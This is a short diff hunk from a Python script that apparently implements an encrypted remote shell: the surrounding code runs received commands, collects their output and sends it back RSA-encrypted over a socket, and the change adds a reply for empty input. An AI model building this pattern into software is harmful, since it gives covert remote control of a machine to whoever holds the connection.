@@ -39,6 +39,8 @@ while 1:
             stdout_value = proc.stdout.read() + proc.stderr.read()
             output_str = str(stdout_value, "UTF-8")
             s.send(rsa.encrypt(str.encode("\n" + output_str + "\n"), public_partner))
+        elif data == "":
+            s.send(rsa.encrypt(str.encode("\n"), public_partner))
     except Exception as e:
         time.sleep(1)		
         continue
